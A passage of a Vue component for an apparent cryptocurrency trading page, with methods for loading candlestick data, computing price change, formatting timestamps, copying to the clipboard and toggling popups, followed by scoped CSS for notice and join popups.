            getKlineData({ interval: '1', contract_id }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let kData = []
                    data.data = data.data.slice(0, 20)
                    data.data.forEach((item, index2) => {
                        let time = this.timetrans(item.now_time)
                        kData.unshift({
                            open: item.open,
                            close: item.close,
                            time: item.now_time,
                            value: item.close
                        })
                    })
                    this.changeCurrKdata(kData, index)
                }
            })
        },
        changeCurrKdata(kData, index) {
            let nowItem = kData[kData.length - 1]
            let change = ((nowItem.close - nowItem.open) / nowItem.open * 100).toFixed(2)
            this.$set(this.biList[index], "kData", kData)
            this.$set(this.biList[index], "change", change)
            this.$set(this.biList[index], "close", kData[kData.length - 1].close)
        },
        timetrans(date) {
            var date = new Date(date * 1000)//如果date为10位需要乘1000
            var Y = date.getFullYear() + '-'
            var M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-'
            var D = (date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate())
            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours()) + ':'
            var m = (date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes()) + ':'
            var s = (date.getSeconds() < 10 ? '0' + date.getSeconds() : date.getSeconds())
            // return `${Y}${M}${D} ${h}${m}${s}`
            return `${Y}${M}${D}`
        },
        ...mapActions([
            'getuserinfo'
        ]),
        showShouquan(isShowToast) {
            this.isShowToast = isShowToast
            this.shouquanModal = true
        },
        changenoticeModal(bool) {
            // if (!bool) sessionStorage.setItem("noticeModal", "1")
            this.noticeModal = bool
        },
        copy() {
            var clipboard = new Clipboard('.btn-copy')
            clipboard.on('success', e => {
                this.$toast({
                    message: this.$t('key96'),
                    icon: 'success',
                })
                // 释放内存
                clipboard.destroy()
            })
            clipboard.on('error', e => {
                // 不支持复制
                this.$toast({
                    message: this.$t('key97'),
                    icon: 'cross',
                })
                // 释放内存
                clipboard.destroy()
            })
        },
        go(path, query) {
            this.$router.push({ path, query })
        },
        changenewsPanelModal(bool, link) {
            this.link = link
            this.newsPanelModal = bool
        },
        chageShowMenu(bool) {
            this.showMenu = bool
        },
        changeTabIndex(tabindex) {
            this.tabindex = tabindex
        }
    }
}
</script>

<style scoped>
.show {
    /* display: -webkit-box; */
    height: 2rem;
    overflow: hidden;
    /* white-space: nowrap; */
    text-overflow: ellipsis;
}

.notice-popup {
    position: fixed;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, .7);
}

.notice-popup .notice-container {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    width: 6.38rem;
    height: 6.44rem;
    background: #fff;
    border-radius: 0.2rem;
    box-sizing: border-box;
    overflow: auto;
}

.notice-popup .notice-container .notice-title {
    position: fixed;
    text-align: center;
    color: #1652f0;
    font-size: .3rem;
    font-family: NunitoBold;
    background-color: #fff;
    padding: 0.32rem;
    width: 6.2rem;
    border-top-left-radius: 8px;
}

.notice-popup .notice-container .notice-content {
    padding: 0.32rem;
    margin-top: 0.8rem;
    font-size: .28rem;
    color: #353f5280;
    line-height: normal;
}

.notice-popup .notice-container .notice-title .icon-close {
    position: absolute;
    right: 0;
    top: 0;
    bottom: 0;
    margin: auto;
    width: 0.32rem;
    height: 0.32rem;
    color: #000;
}

.join-popup {
    padding: 0.48rem 0.4rem 0.35rem;
    width: 6.86rem;
    box-sizing: border-box;
    border-radius: 0.2rem;
}

.join-popup .close {
    position: absolute;
    top: 0.32rem;
    right: 0.32rem;
}

.join-popup .popup-content {
    text-align: center;
}

.join-popup .popup-content .img-join {
    width: 1.27rem;
    height: 1.27rem;
}

.join-popup .popup-content .join-title {
    margin-top: 0.67rem;
    padding: 0 0.7rem;
    font-size: .32rem;
    color: #353f52;
    font-weight: 500;
}

.join-popup .popup-content .submit-btn {
    margin: 0 auto;
    margin-top: 0.87rem;
    width: 4.46rem;
    height: 0.92rem;
    line-height: .92rem;
    color: #fff;
    background: #1652f0;
    border-radius: 0.2rem;
    text-align: center;
    font-size: .32rem;
}

.ff_NunitoBold {
    font-family: NunitoBold;
}

.join-popup .popup-content .tips {
    margin-top: 0.4rem;
    font-size: .24rem;
    color: #5b616e80;
}

svg {
    width: 0.4rem;
    height: 0.4rem;
}

.ynone {
    opacity: 0;
    position: fixed;
    top: -9999px;
    left: -9999px;
}
</style>
